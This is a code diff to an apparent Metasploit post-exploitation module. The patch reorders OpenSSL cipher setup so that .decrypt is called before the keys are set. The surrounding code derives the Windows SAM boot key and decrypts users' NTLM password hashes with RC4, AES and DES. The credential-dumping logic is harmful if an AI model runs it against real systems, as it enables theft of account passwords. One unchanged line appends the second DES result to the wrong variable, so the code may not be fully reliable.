@@ -145,15 +145,16 @@ class MetasploitModule < Msf::Post
         hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
 
         rc4 = OpenSSL::Cipher.new("rc4")
+        rc4.decrypt
         rc4.key = hash.digest
         hbootkey  = rc4.update(vf[0x80, 32])
         hbootkey << rc4.final
         hbootkey
       when 2
         aes = OpenSSL::Cipher.new('aes-128-cbc')
+        aes.decrypt
         aes.key = bootkey
         aes.padding = 0
-        aes.decrypt
         aes.iv = vf[0x78, 16]
         aes.update(vf[0x88, 16]) # we need only 16 bytes
       else
@@ -261,6 +262,7 @@ class MetasploitModule < Msf::Post
         md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
 
         rc4 = OpenSSL::Cipher.new('rc4')
+        rc4.decrypt
         rc4.key = md5.digest
         okey = rc4.update(enchash[4, 16])
       when 2
@@ -269,9 +271,9 @@ class MetasploitModule < Msf::Post
         end
 
         aes = OpenSSL::Cipher.new('aes-128-cbc')
+        aes.decrypt
         aes.key = hbootkey[0, 16]
         aes.padding = 0
-        aes.decrypt
         aes.iv = enchash[8, 16]
         okey = aes.update(enchash[24, 16]) # we need only 16 bytes
       else
@@ -282,17 +284,19 @@ class MetasploitModule < Msf::Post
     des_k1, des_k2 = rid_to_key(rid)
 
     d1 = OpenSSL::Cipher.new('des-ecb')
+    d1.decrypt
     d1.padding = 0
     d1.key = des_k1
 
     d2 = OpenSSL::Cipher.new('des-ecb')
+    d2.decrypt
     d2.padding = 0
     d2.key = des_k2
 
-    d1o  = d1.decrypt.update(okey[0,8])
+    d1o  = d1.update(okey[0,8])
     d1o << d1.final
 
-    d2o  = d2.decrypt.update(okey[8,8])
+    d2o  = d2.update(okey[8,8])
     d1o << d2.final
     d1o + d2o
   end
